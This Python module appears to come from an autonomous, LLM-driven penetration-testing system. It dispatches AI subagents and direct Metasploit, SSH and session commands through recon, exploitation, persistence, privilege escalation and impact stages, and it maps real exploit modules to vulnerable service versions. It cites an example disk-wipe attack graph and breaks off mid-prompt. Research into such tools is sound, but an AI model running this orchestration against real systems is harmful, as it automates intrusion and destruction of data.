"""
Graph-Driven Orchestrator — walks an AttackGraph, dispatching subagents per node.

Architecture:
    Load/receive AttackGraph
        │
        ▼
    ┌─ LOOP ─────────────────────────────────────────────┐
    │  ready = graph.ready_nodes()                       │
    │  if none → done                                    │
    │  for each ready node:                              │
    │    context = graph.gather_preceding_findings(node)  │
    │    dispatch to subagent (based on node.agent_type)  │
    │    write findings + commands back to node           │
    │    update graph status                             │
    │    graph.save() (checkpoint)                       │
    └────────────────────────────────────────────────────┘

Usage:
    from core_agents.orchestrator import run_graph
    from core_agents.attack_graph import AttackGraph

    graph = AttackGraph.load("examples/disk_wipe_graph.json")
    result = run_graph(graph)

    # Or interactively:
    python -m core_agents.orchestrator examples/disk_wipe_graph.json
"""

import re
import sys
import json
import time
import logging
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from core_agents.attack_graph import AttackGraph, AttackNode, AttackEdge, EdgeCheck, NodeStatus
from core_agents.common import (
    Colors, print_colored, run_ssh_command, call_llm, parse_json_response,
    MAX_PIPELINE_RETRIES,
)
from langchain_core.messages import HumanMessage

from stages.recon import run_recon
from stages.initial_access import run_exploitation
from stages.persistence import run_persistence
from stages.privesc import run_privesc
from stages.impact import run_impact


# =============================================================================
# MODEL CONFIGURATION — replanner + judge call LLM directly here
# =============================================================================
# Stages 1-4 + Fix 1 fixed the orchestrator's process around replanning. Live
# evidence (see reports/) showed the remaining bottleneck is the LLM's
# instruction-following quality — gpt-4o-mini ignored "DO NOT repeat" hints in
# Stage 4 v2, and hallucinates MSF module paths ~20% of the time. Pinning these
# two calls to gpt-4o (~10x cost of mini) is an experiment to see how much
# improves with model strength alone, before pursuing the more invasive
# replanner_reliability_plan.md stages.
#
# Stage subagents (recon, exploit, persistence, etc.) still use whatever model
# their own modules pick — out of scope for this experiment.
REPLAN_MODEL_NAME = "gpt-4o"
JUDGE_MODEL_NAME = "gpt-4o"


# =============================================================================
# LOGGING — file + console, so we can tail progress in real-time
# =============================================================================

def _setup_logger(graph_name: str) -> logging.Logger:
    """Create a logger that writes to both console and a per-graph log file."""
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = log_dir / f"{graph_name}_{timestamp}.log"

    logger = logging.getLogger(f"orchestrator.{graph_name}")
    logger.setLevel(logging.DEBUG)
    logger.handlers.clear()

    # File handler — everything
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter(
        "%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    ))
    logger.addHandler(fh)

    # Console handler — INFO and above
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(ch)

    logger.info(f"Log file: {log_file}")
    return logger


# =============================================================================
# SUBAGENT DISPATCH — routes a node to the right stage runner
# =============================================================================

def dispatch_node(
    node: AttackNode,
    graph: AttackGraph,
    log: logging.Logger = None,
    explore: bool = False,
) -> dict:
    """
    Execute a single node by dispatching to the appropriate subagent.

    Args:
        explore: If False (default), the subagent MUST follow the node's
                 module/options/commands exactly. No freelancing.
                 If True, the subagent may explore alternatives.
    """
    agent_type = node.agent_type
    preceding = graph.gather_preceding_findings(node.id)
    log = log or logging.getLogger("orchestrator")

    log.info(f"[Dispatch] node='{node.id}' label='{node.label}' agent={agent_type} explore={explore}")
    log.debug(f"  objective: {node.objective[:200]}")
    if node.module:
        log.debug(f"  module: {node.module}  payload: {node.payload}")
        log.debug(f"  module_options: {node.module_options}")
    if node.commands_to_run:
        log.debug(f"  commands_to_run: {node.commands_to_run}")
    if preceding:
        for pid, pf in preceding.items():
            log.info(f"  preceding[{pid}]:")
            log.info(f"    success: {pf.get('success')}")
            log.info(f"    summary: {pf.get('summary', '')}")
            if pf.get("os_detected"):
                log.info(f"    os: {pf.get('os_detected')}")
            if pf.get("ports"):
                ports = pf["ports"]
                port_str = ", ".join(f"{p.get('port')}/{p.get('service','')}" for p in ports[:20])
                log.info(f"    ports ({len(ports)}): {port_str}")
            if pf.get("session_id"):
                log.info(f"    session: {pf.get('session_id')} ({pf.get('session_type','?')}) level={pf.get('access_level','?')}")
            if pf.get("method"):
                log.info(f"    method: {pf.get('method')}")
            if pf.get("technique"):
                log.info(f"    technique: {pf.get('technique')}")

    # --- DIRECT EXECUTION: always try first when node has module/commands ---
    # Skip direct for recon — needs LLM to parse nmap into structured findings
    if (node.module or node.commands_to_run) and agent_type != "recon":
        log.info(f"  [direct] Attempting direct execution (no LLM)...")
        findings = _execute_direct(node, graph, log)
        if findings.get("success"):
            return findings
        # Direct execution failed — return failure, let the walker backtrack
        log.warning(f"  [{node.id}] Direct execution failed: {findings.get('summary', '?')}")
        return findings

    # --- LLM STAGE RUNNERS (recon, or nodes without module/commands) ---
    if agent_type == "recon":
        return _dispatch_recon(node, graph, preceding, explore)
    elif agent_type == "exploit":
        return _dispatch_exploit(node, graph, preceding, explore)
    elif agent_type == "persistence":
        return _dispatch_persistence(node, graph, preceding, explore)
    elif agent_type == "privesc":
        return _dispatch_privesc(node, graph, preceding, explore)
    elif agent_type == "impact":
        return _dispatch_impact(node, graph, preceding, explore)
    elif agent_type == "discovery":
        return _dispatch_discovery(node, graph, preceding, explore)
    else:
        log.warning(f"  Unknown agent_type '{agent_type}' — skipping node.")
        return {"success": False, "summary": f"Unknown agent_type: {agent_type}"}


# =============================================================================
# STRICT MODE DIRECTIVE — injected when explore=False
# =============================================================================

_STRICT_PREFIX = """
=== MANDATORY DIRECTIVE — STRICT MODE ===
You MUST follow the EXACT plan below. Do NOT query the knowledge base for
alternatives. Do NOT choose a different module. Do NOT explore other services.
Execute ONLY what is specified. If it fails, report the failure — do NOT
try something else.
==========================================
"""


def _build_objective(node: AttackNode, graph: AttackGraph, explore: bool) -> str:
    """Build the objective string, optionally with strict directive."""
    objective = node.objective or graph.objective

    if node.module:
        if explore:
            # Hint — agent may override
            objective += f"\n\nSUGGESTED MODULE: {node.module}"
        else:
            # Strict — agent must follow
            objective = _STRICT_PREFIX + objective
            objective += f"\n\nREQUIRED MODULE: {node.module}"

        if node.payload:
            objective += f"\nPayload: {node.payload}"
        if node.module_options:
            objective += f"\nModule options: {json.dumps(node.module_options)}"
        if node.payload_options:
            objective += f"\nPayload options: {json.dumps(node.payload_options)}"

        if not explore:
            # Build exact MSF command sequence for the agent
            cmds = [f"use {node.module}"]
            for k, v in node.module_options.items():
                cmds.append(f"set {k} {v}")
            if node.payload:
                cmds.append(f"set PAYLOAD {node.payload}")
                for k, v in node.payload_options.items():
                    cmds.append(f"set {k} {v}")
            cmds.append("run")
            objective += "\n\nEXACT COMMAND SEQUENCE:\n" + "\n".join(
                f"  {i+1}. {cmd}" for i, cmd in enumerate(cmds)
            )

    elif node.commands_to_run:
        if not explore:
            objective = _STRICT_PREFIX + objective
        objective += f"\n\nCOMMANDS TO EXECUTE:\n" + "\n".join(
            f"  {i+1}. {cmd}" for i, cmd in enumerate(node.commands_to_run)
        )

    elif not explore:
        objective = _STRICT_PREFIX + objective

    return objective


# =============================================================================
# DIRECT EXECUTION — bypass LLM in strict mode
# =============================================================================

def _execute_direct(node: AttackNode, graph: AttackGraph, log: logging.Logger) -> dict:
    """
    Execute a node directly without any LLM calls.

    Routes based on tool_name first, then falls back to heuristics:
      - tool_name="metasploit" + module → structured MSF module execution
      - tool_name="metasploit" + commands_to_run → raw MSF console commands
      - tool_name="session" → session commands on target (needs active session)
      - tool_name="nmap"/"ssh"/etc → SSH commands on Kali
      - Otherwise: heuristic based on agent_type / preceding session
    """
    from tools.metasploit_tools import msf_session

    preceding = graph.gather_preceding_findings(node.id)
    tool = (node.tool_name or "").lower()

    # Structured MSF module execution
    if node.module:
        return _execute_msf_module(node, graph, log, msf_session)

    if not node.commands_to_run:
        log.warning(f"  [direct] Node has no module or commands — cannot execute directly")
        return {"success": False, "summary": "No module or commands defined on node"}

    # Route by tool_name first
    if tool == "metasploit":
        return _execute_msf_console_commands(node, graph, log, msf_session)

    if tool == "session":
        session_id, _, _ = _find_session(preceding)
        if not session_id:
            return {"success": False, "summary": "tool_name=session but no active session in preceding nodes"}
        return _execute_session_commands(node, log, msf_session, session_id)

    # Heuristic fallback (no tool_name): if we have a session and node is post-exploitation, use it
    session_id, _, _ = _find_session(preceding)
    if session_id and node.agent_type in ("impact", "discovery", "persistence"):
        return _execute_session_commands(node, log, msf_session, session_id)

    return _execute_ssh_commands(node, log)


def _execute_msf_console_commands(
    node: AttackNode, graph: AttackGraph,
    log: logging.Logger, msf_session,
) -> dict:
    """Execute raw MSF console commands (when no structured module is set)."""
    target_ip = node.target_ip or graph.target_ip
    all_output = ""
    params = _resolve_command_params(node, log)

    for template in node.commands_to_run:
        cmd = _render_command(template, params)
        log.info(f"  [direct] msf> {cmd}")
        output = msf_session.send_command(cmd, timeout=120)
        node.add_command(cmd, tool="msf_console", output=output, target="msf_console")
        all_output += output + "\n"

        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    return _parse_msf_output(all_output, node, target_ip, log)


def _execute_msf_module(
    node: AttackNode, graph: AttackGraph,
    log: logging.Logger, msf_session,
) -> dict:
    """Execute a Metasploit module directly via console commands.

    On retries, swap in alternative values from `module_options_alternatives`
    (or `payload_options_alternatives` if present) based on the current retry
    count. retries=0 → original options. retries=1 → alts[0]. etc.
    """
    target_ip = node.target_ip or graph.target_ip

    # Build effective options using alternatives based on retry count
    retry_idx = node.retries  # 0 on first attempt, 1 on first retry, ...
    effective_module_options = dict(node.module_options)
    effective_payload = node.payload
    effective_payload_options = dict(node.payload_options)
    tweaks_applied = []

    if retry_idx > 0 and node.module_options_alternatives:
        alt_idx = retry_idx - 1  # retries=1 → alts[0]
        for field_name, alts in node.module_options_alternatives.items():
            if alt_idx < len(alts):
                new_value = alts[alt_idx]
                if field_name == "PAYLOAD":
                    effective_payload = new_value
                elif field_name in effective_payload_options:
                    effective_payload_options[field_name] = new_value
                else:
                    effective_module_options[field_name] = new_value
                tweaks_applied.append(f"{field_name}={new_value}")
        if tweaks_applied:
            log.info(f"  [direct] Retry {retry_idx} tweaks: {', '.join(tweaks_applied)}")

    # Build command sequence from effective options
    cmds = [f"use {node.module}"]
    for k, v in effective_module_options.items():
        cmds.append(f"set {k} {v}")
    if effective_payload:
        cmds.append(f"set PAYLOAD {effective_payload}")
        for k, v in effective_payload_options.items():
            cmds.append(f"set {k} {v}")
    cmds.append("run")

    # Execute each command
    all_output = ""
    for cmd in cmds:
        log.info(f"  [direct] > {cmd}")
        output = msf_session.send_command(cmd, timeout=120)
        node.add_command(cmd, tool="msf_console", output=output, target="msf_console")
        all_output += output + "\n"

        # Log first 300 chars of output
        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    # Parse the combined output for results
    return _parse_msf_output(all_output, node, target_ip, log)


def _resolve_command_params(node: AttackNode, log: logging.Logger) -> dict:
    """
    Build the effective command_params for the current retry, applying
    alternatives based on node.retries (same semantics as MSF options).
    """
    effective = dict(node.command_params)
    retry_idx = node.retries

    if retry_idx > 0 and node.command_params_alternatives:
        alt_idx = retry_idx - 1
        tweaks = []
        for field_name, alts in node.command_params_alternatives.items():
            if alt_idx < len(alts):
                effective[field_name] = alts[alt_idx]
                tweaks.append(f"{field_name}={alts[alt_idx]}")
        if tweaks:
            log.info(f"  [direct] Retry {retry_idx} command_params tweaks: {', '.join(tweaks)}")

    return effective


def _render_command(template: str, params: dict) -> str:
    """Substitute {name} placeholders in a command string using params."""
    if not params:
        return template
    try:
        return template.format(**params)
    except (KeyError, IndexError):
        # Missing placeholder — return the template untouched
        return template


# Concrete failure-indicator phrases. These are case-insensitive substring
# matches against command output. The list comes from observed false positives
# in live runs (see reports/stage_{1,2,3}_live_test.md) — every entry here is
# a phrase that previously got marked success=True despite being a clear failure.
_FAILURE_INDICATORS: list[str] = [
    "permission denied",
    "no such file or directory",
    "cannot access",
    "command not found",
    "operation not permitted",
    "connection refused",
    "exec format error",
    "is a directory",          # "echo > /etc/passwd" style mistakes
    "bad substitution",        # bash syntax error
    "syntax error",
    "does not exist",          # covers "file does not exist" etc.
    "ssh connection/execution error",   # from common.run_ssh_command
    "(exit code:",             # from common.run_ssh_command's non-zero-exit wrap
    "could not resolve host",
    "host key verification failed",
]


def _command_output_indicates_failure(output: str) -> tuple[bool, str]:
    """
    Scan one command's stdout/stderr for known failure phrases.

    Returns (is_failure, matched_phrase). The match is case-insensitive
    substring. Used by the session/SSH executors to overrule the previous
    loose "any non-empty output = success" heuristic that caused multiple
    Stage 1-3 live runs to mark nodes SUCCESS when commands clearly failed.

    `(no output)` is NOT a failure on its own — many useful commands
    (mkdir, chmod, echo > file) legitimately produce nothing.
    """
    if not output:
        return False, ""
    low = output.lower()
    for phrase in _FAILURE_INDICATORS:
        if phrase in low:
            return True, phrase
    return False, ""


def _scan_commands_for_failure(
    node: AttackNode, log: logging.Logger,
) -> tuple[bool, str]:
    """
    Walk the node's CommandRecord list and return the first failure
    detected, if any. Returns (any_failed, summary_line).
    """
    for rec in node.commands:
        bad, phrase = _command_output_indicates_failure(rec.output)
        if bad:
            summary = (
                f"Command failed ({phrase!r}): {rec.command[:80]}"
            )
            log.warning(f"  [direct] {summary}")
            return True, summary
    return False, ""


def _execute_ssh_commands(node: AttackNode, log: logging.Logger) -> dict:
    """Execute shell commands on Kali via SSH (with templated params)."""
    all_output = ""
    params = _resolve_command_params(node, log)

    for template in node.commands_to_run:
        cmd = _render_command(template, params)
        log.info(f"  [direct] $ {cmd}")
        output = run_ssh_command(cmd)
        node.add_command(cmd, tool="ssh", output=output, target="kali")
        all_output += output + "\n"

        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    failed, fail_summary = _scan_commands_for_failure(node, log)
    if failed:
        return {
            "success": False,
            "summary": fail_summary,
            "output": all_output[:5000],
        }

    return {
        "success": True,
        "summary": f"Executed {len(node.commands_to_run)} command(s) on Kali",
        "output": all_output[:5000],
    }


def _execute_session_commands(
    node: AttackNode, log: logging.Logger,
    msf_session, session_id: str,
) -> dict:
    """Execute commands on the target through an active MSF session (with templated params)."""
    all_output = ""
    params = _resolve_command_params(node, log)

    for template in node.commands_to_run:
        cmd = _render_command(template, params)
        log.info(f"  [direct] session({session_id})> {cmd}")
        output = msf_session.run_session_command(session_id, cmd, timeout=30)
        node.add_command(cmd, tool="session", output=output, target="target")
        all_output += output + "\n"

        preview = output.strip()[:300]
        if preview:
            log.info(f"  [direct]   {preview}")

    failed, fail_summary = _scan_commands_for_failure(node, log)
    if failed:
        return {
            "success": False,
            "session_id": session_id,
            "summary": fail_summary,
            "output": all_output[:5000],
        }

    return {
        "success": True,
        "session_id": session_id,
        "summary": f"Executed {len(node.commands_to_run)} command(s) on target via session {session_id}",
        "output": all_output[:5000],
    }


def _parse_msf_output(output: str, node: AttackNode, target_ip: str, log: logging.Logger) -> dict:
    """
    Parse Metasploit output to determine success and extract findings.

    Looks for:
      - "session X opened" → session created
      - "Login Successful" → credentials found
      - "Exploit completed, but no session" → failed
    """
    findings = {
        "success": False,
        "target_ip": target_ip,
        "exploit_used": node.module,
        "session_id": "",
        "session_type": "",
        "access_level": "unknown",
        "summary": "",
    }

    # Check for session opened
    session_match = re.search(
        r'(command shell|meterpreter)\s+session\s+(\d+)\s+opened',
        output, re.IGNORECASE,
    )
    if session_match:
        findings["success"] = True
        findings["session_type"] = session_match.group(1).lower().replace(" ", "_")
        findings["session_id"] = session_match.group(2)
        findings["summary"] = (
            f"Session {findings['session_id']} ({findings['session_type']}) "
            f"opened on {target_ip} via {node.module}"
        )
        log.info(f"  [direct] SESSION OPENED: {findings['summary']}")
        return findings

    # Check for successful login (ssh_login auxiliary)
    login_match = re.search(
        r'Success:\s*[\'"]?(\S+?)[\'"]?\s*:\s*[\'"]?(\S+?)[\'"]?\s',
        output, re.IGNORECASE,
    )
    if not login_match:
        login_match = re.search(
            r'Login Successful:\s*(\S+)',
            output, re.IGNORECASE,
        )
    if login_match:
        findings["success"] = True
        findings["summary"] = f"Login successful on {target_ip} via {node.module}"
        log.info(f"  [direct] LOGIN FOUND: {login_match.group(0)}")

        # ssh_login creates a session — check for it
        session_after = re.search(r'session\s+(\d+)\s+opened', output, re.IGNORECASE)
        if session_after:
            findings["session_id"] = session_after.group(1)
            findings["session_type"] = "command_shell"
            findings["summary"] += f" — session {findings['session_id']}"
        return findings

    # Check for explicit failure
    if "exploit completed, but no session" in output.lower():
        findings["summary"] = f"Exploit completed but no session created via {node.module}"
        log.info(f"  [direct] FAILED: no session created")
    elif "auxiliary module execution completed" in output.lower():
        findings["summary"] = f"Auxiliary module completed — no credentials found via {node.module}"
        log.info(f"  [direct] COMPLETED: no credentials found")
    else:
        findings["summary"] = f"Module execution completed — result unclear via {node.module}"
        log.info(f"  [direct] COMPLETED: result unclear, checking output...")

    return findings


# =============================================================================
# HELPERS — extract session/recon info from preceding findings
# =============================================================================

def _find_session(preceding: dict) -> tuple[str, str, str]:
    """Find session_id, session_type, access_level from preceding findings."""
    for pred_id, pf in preceding.items():
        if "session_id" in pf and pf.get("success"):
            sid = str(pf["session_id"])
            stype = pf.get("session_type", "shell")
            level = pf.get("access_level", "unknown")
            # Check if a later node escalated
            if "new_level" in pf and pf.get("success"):
                level = pf["new_level"]
            return sid, stype, level
    return "", "", "unknown"


def _find_recon(preceding: dict) -> tuple[dict, str, str]:
    """Find target_info, raw_nmap, os_info from preceding findings."""
    target_info = {}
    raw_nmap = ""
    os_info = ""
    for pred_id, pf in preceding.items():
        if "ports" in pf or "target_info" in pf:
            target_info = pf.get("target_info", {})
            raw_nmap = pf.get("raw_nmap_output", "")
        if "os_detected" in pf:
            os_info = pf["os_detected"]
    return target_info, raw_nmap, os_info


# =============================================================================
# DISPATCH IMPLEMENTATIONS — one per agent type
# =============================================================================

def _dispatch_recon(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    objective = _build_objective(node, graph, explore)
    findings = run_recon(
        target_ip=node.target_ip or graph.target_ip,
        goal=objective,
    )
    return dict(findings)


def _dispatch_exploit(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    target_info, raw_recon, _ = _find_recon(preceding)
    if not target_info:
        target_info = {"ip": node.target_ip or graph.target_ip}
    objective = _build_objective(node, graph, explore)

    # Always trim raw nmap — the full dump causes 187K+ tokens which exceeds
    # gpt-4o-mini's 128K context limit. The structured target_info.ports has
    # all the data the LLM needs.
    ports_list = target_info.get("ports", [])
    if ports_list:
        lines = [f"  {p.get('port')}/{p.get('service','')} {p.get('version','')}" for p in ports_list[:30]]
        raw_recon = f"Open ports on {target_info.get('ip', '')}:\n" + "\n".join(lines)
    else:
        raw_recon = ""

    findings = run_exploitation(
        target_info=target_info,
        objective=objective,
        raw_recon=raw_recon,
    )
    return dict(findings)


def _dispatch_persistence(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    if not session_id:
        return {
            "success": False, "method": "", "details": "No active session.",
            "summary": "Persistence skipped — no session available.",
        }
    objective = _build_objective(node, graph, explore)

    findings = run_persistence(
        target_ip=node.target_ip or graph.target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        objective=objective,
    )
    return dict(findings)


def _dispatch_privesc(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    _, _, os_info = _find_recon(preceding)
    if not session_id:
        return {
            "success": False, "technique": "", "previous_level": "",
            "new_level": "", "summary": "PrivEsc skipped — no session available.",
        }

    findings = run_privesc(
        target_ip=node.target_ip or graph.target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        os_info=os_info,
        objective=_build_objective(node, graph, explore),
    )
    return dict(findings)


def _dispatch_impact(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    if not session_id:
        return {
            "success": False, "actions": [],
            "summary": "Impact skipped — no session available.",
        }

    prior_lines = [f"{pid}: {pf.get('summary', 'N/A')}" for pid, pf in preceding.items()]
    objective = _build_objective(node, graph, explore)

    findings = run_impact(
        target_ip=node.target_ip or graph.target_ip,
        objective=objective,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        prior_findings_summary="\n".join(prior_lines),
    )
    return dict(findings)


def _dispatch_discovery(node: AttackNode, graph: AttackGraph, preceding: dict, explore: bool) -> dict:
    session_id, session_type, access_level = _find_session(preceding)
    if not session_id:
        return {
            "success": False, "actions": [],
            "summary": "Discovery skipped — no session available.",
        }

    prior_lines = [f"{pid}: {pf.get('summary', 'N/A')}" for pid, pf in preceding.items()]
    objective = _build_objective(node, graph, explore)

    findings = run_impact(
        target_ip=node.target_ip or graph.target_ip,
        objective=objective,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
        prior_findings_summary="\n".join(prior_lines),
    )
    return dict(findings)


# =============================================================================
# MSF MODULE → TARGET REQUIREMENTS — programmatic version validation
# =============================================================================
#
# Maps MSF module names to the service/version they require.
# Used to reject replanner proposals that don't match the actual target.

MSF_MODULE_REQUIREMENTS: dict = {
    # ProFTPD
    "exploit/unix/ftp/proftpd_133c_backdoor": {
        "service_contains": "ftp",
        "version_contains": "1.3.3c",  # ONLY 1.3.3c, NOT 1.3.5
    },
    "exploit/unix/ftp/proftpd_modcopy_exec": {
        "service_contains": "ftp",
        "version_contains": "1.3.5",   # 1.3.5 (mod_copy)
    },
    # Samba
    "exploit/multi/samba/usermap_script": {
        "service_contains": "samba",
        # Vulnerable: 3.0.20 - 3.0.25rc3 only. NOT 4.x.
        "version_pattern": r"3\.0\.2[0-5]",
    },
    "exploit/linux/samba/is_known_pipename": {
        "service_contains": "samba",
        # Vulnerable: 3.5.0 to 4.6.4 (CVE-2017-7494)
        "version_pattern": r"(3\.[5-9]|3\.1[0-9]|4\.[0-5]|4\.6\.[0-4])",
    },
    # UnrealIRCd
    "exploit/unix/irc/unreal_ircd_3281_backdoor": {
        "service_contains": "irc",
        "version_contains": "Unreal",
    },
    # Rails
    "exploit/multi/http/rails_secret_deserialization": {
        "service_contains": "http",
        # Needs the Rails app actually serving on the configured RPORT
    },
    # Drupal
    "exploit/multi/http/drupal_drupageddon": {
        "service_contains": "http",
        "version_pattern": r"7\.([0-9]|[12][0-9]|3[01])(?!\d)",  # 7.0 - 7.31
    },
}


def _validate_msf_module_for_target(
    module: str, recon_findings: dict, log: logging.Logger,
) -> tuple[bool, str]:
    """
    Check if an MSF module is applicable to the target based on recon findings.

    Returns (ok, reason). If module is not in MSF_MODULE_REQUIREMENTS,
    returns (True, "no requirements known") — we don't block unknown modules.
    """
    if module not in MSF_MODULE_REQUIREMENTS:
        return True, "no version requirements known for this module"

    req = MSF_MODULE_REQUIREMENTS[module]
    ports = recon_findings.get("ports", [])
    if not ports:
        return False, "no ports in recon findings"

    service_filter = req.get("service_contains", "").lower()
    version_contains = req.get("version_contains", "")
    version_pattern = req.get("version_pattern", "")

    matching_ports = []
    for p in ports:
        service = (p.get("service", "") or "").lower()
        version = p.get("version", "") or ""
        if service_filter and service_filter not in service:
            continue
        # Check version constraints
        if version_contains and version_contains not in version:
            continue
        if version_pattern and not re.search(version_pattern, version):
            continue
        matching_ports.append(f"{p.get('port')}/{service} {version}")

    if matching_ports:
        return True, f"matching ports found: {', '.join(matching_ports)}"

    # Build a useful failure reason
    found_services = [
        f"{p.get('port')}/{p.get('service','')} {p.get('version','')}"
        for p in ports if service_filter in (p.get("service", "") or "").lower()
    ]
    reason = (
        f"no port matches requirements for {module} "
        f"(needs service~{service_filter!r}"
    )
    if version_contains:
        reason += f", version contains {version_contains!r}"
    if version_pattern:
        reason += f", version matches /{version_pattern}/"
    reason += ")"
    if found_services:
        reason += f". Found {service_filter} on: {found_services}"
    return False, reason


def _build_msf_module_checks(module: str) -> list[EdgeCheck]:
    """
    Build EdgeCheck objects from MSF_MODULE_REQUIREMENTS for a given module.
    These get attached to the edge so the walker enforces them on every traversal.
    """
    if module not in MSF_MODULE_REQUIREMENTS:
        return []

    req = MSF_MODULE_REQUIREMENTS[module]
    checks = []
    service_filter = req.get("service_contains", "")
    version_contains = req.get("version_contains", "")
    version_pattern = req.get("version_pattern", "")

    if service_filter and version_contains:
        # Composite check: any port with matching service AND version substring
        checks.append(EdgeCheck(
            field="ports",
            operator="any_port",
            expected={"service": service_filter, "version": version_contains},
            description=f"port with service~{service_filter} AND version~{version_contains} "
                        f"(required by {module})",
        ))
    elif service_filter:
        checks.append(EdgeCheck(
            field="ports",
            operator="any_port",
            expected={"service": service_filter},
            description=f"port with service~{service_filter} (required by {module})",
        ))
    # Note: version_pattern (regex) isn't directly expressible as an EdgeCheck operator,
    # so the programmatic validation in _validate_msf_module_for_target catches those.
    # The persisted check above provides a coarse safety net that survives JSON reload.
    return checks


def _gather_recon_findings(graph: AttackGraph) -> dict:
    """Find the most relevant recon findings in the graph (any node with ports)."""
    for node in graph.nodes.values():
        if node.status == NodeStatus.SUCCESS.value and node.findings.get("ports"):
            return node.findings
    return {}


def _cap_text(s: str, cap: int) -> str:
    """Truncate `s` to `cap` chars, preserving the tail (recent stderr is what matters)."""
    if not s or len(s) <= cap:
        return s or ""
    return "...[truncated]...\n" + s[-cap:]


def _recent_command_excerpts(node: AttackNode, n: int = 3, cap: int = 2048) -> list[dict]:
    """
    Return the last `n` CommandRecord entries from `node`, with each `output`
    capped at `cap` chars (tail preserved). Used to feed prose context — banners,
    stderr, exit codes — to the replanner, not just structured findings.
    """
    out = []
    for rec in node.commands[-n:]:
        out.append({
            "command": rec.command,
            "tool": rec.tool,
            "exit_code": rec.exit_code,
            "output_tail": _cap_text(rec.output or "", cap),
        })
    return out


# =============================================================================
# JUDGE — layer-2 strategic decision after each node attempt
# =============================================================================
#
# A small LLM call that runs at three trigger points:
#   post_retry — inside _execute_node after each failed attempt; decides whether
#                another retry will help or whether to escalate to the replanner.
#   post_node  — in run_graph after a node completes; decides whether to follow
#                the planned outgoing edges or jump straight to the replanner.
#   pre_replan — implicit in escalate decisions above.
#
# Output is a tiny intent: {action, hint}. Code interprets the action; the hint
# is for human readability in logs.

JUDGE_PROMPT = """You are a step-by-step strategic judge for an autonomous pentest.

After a node attempt, decide what to do NEXT. Choose ONE action:

  continue — Node succeeded, or failure is transient (timeout, race condition,
             port flapping). Proceed with the existing plan.
  adapt    — Node failed AND a parameter tweak (alt payload, alt path, alt
             credentials) plausibly fixes it. Only choose this if
             alternatives_remaining > 0 — otherwise the next retry will be
             identical.
  escalate — This approach is dead. The next retry will not help. Call the
             replanner now rather than burning more attempts.

Respond ONLY with JSON:
  {"action": "continue" | "adapt" | "escalate", "hint": "one short sentence"}

The hint should briefly explain your reasoning so it shows up in logs."""


def _build_judge_context(trigger: str, node: AttackNode, graph: AttackGraph) -> str:
    """Minimal context: just node state, recent commands, and edge count."""
    recent_cmds = _recent_command_excerpts(node, n=3, cap=1024)
    alternatives_remaining = max(0, node.max_retries - node.retries)
    outgoing_edges_count = len(graph.outgoing_edges(node.id))

    return (
        f"TRIGGER: {trigger}\n"
        f"NODE: {node.id} ({node.label})\n"
        f"STATUS: {node.status}\n"
        f"RETRIES: {node.retries}/{node.max_retries}  "
        f"ALTERNATIVES_REMAINING: {alternatives_remaining}\n"
        f"LAST FAILURE: {node.metadata.get('last_failure_reason', '(none)')}\n"
        f"OUTGOING EDGES DEFINED: {outgoing_edges_count}\n\n"
        f"RECENT COMMAND OUTPUT (last 3, tails capped at 1KB):\n"
        f"{json.dumps(recent_cmds, indent=2, default=str)}\n"
    )


def judge(
    trigger: str, node: AttackNode, graph: AttackGraph, log: logging.Logger,
) -> dict:
    """
    One LLM call. Returns {'action': 'continue'|'adapt'|'escalate', 'hint': str}.

    On any failure (LLM error, parse error, unknown action), defaults to
    'continue' so the existing flow is never broken by judge failures.
    """
    context = _build_judge_context(trigger, node, graph)
    log.debug(f"[Judge] Context ({trigger}, {len(context)} chars):\n{context}")

    try:
        resp = call_llm(
            messages=[HumanMessage(content=context)],
            system_prompt=JUDGE_PROMPT,
            model_name=JUDGE_MODEL_NAME,
        )
        result = parse_json_response(resp.content)
    except Exception as e:
        log.warning(f"[Judge] LLM call failed ({e}) — defaulting to continue")
        return {"action": "continue", "hint": "(judge call failed)"}

    action = result.get("action", "continue")
    if action not in ("continue", "adapt", "escalate"):
        log.warning(f"[Judge] Unknown action '{action}' — defaulting to continue")
        action = "continue"
    hint = result.get("hint", "")
    log.info(f"[Judge] {trigger}: {action} -- {hint}")
    return {"action": action, "hint": hint}


def _try_replanner(
    graph: AttackGraph, current: str, log: logging.Logger,
    checkpoint_path: str, replan_attempts: int, max_replan_attempts: int,
    explore: bool,
) -> tuple[Optional[str], int]:
    """
    Try to replan from `current`. Returns (new_target_or_None, updated_attempts).

    Returns (None, replan_attempts) without firing the LLM if explore is off,
    the budget is exhausted, or the LLM gave up.
    """
    if not explore:
        return None, replan_attempts
    if replan_attempts >= max_replan_attempts:
        log.info(
            f"[Orchestrator] Replan budget exhausted "
            f"({replan_attempts}/{max_replan_attempts})"
        )
        return None, replan_attempts
    replan_attempts += 1
    log.info(
        f"[Orchestrator] Replan attempt {replan_attempts}/{max_replan_attempts} "
        f"from '{current}'"
    )
    new_target = _replan_from(graph, current, log)
    if new_target:
        _checkpoint(graph, checkpoint_path, log)
    return new_target, replan_attempts


# =============================================================================
# REPLANNER — grow new edges/nodes when the graph is stuck
# =============================================================================

REPLAN_PROMPT = """You are an attack graph replanner for an autonomous penetration testing system.

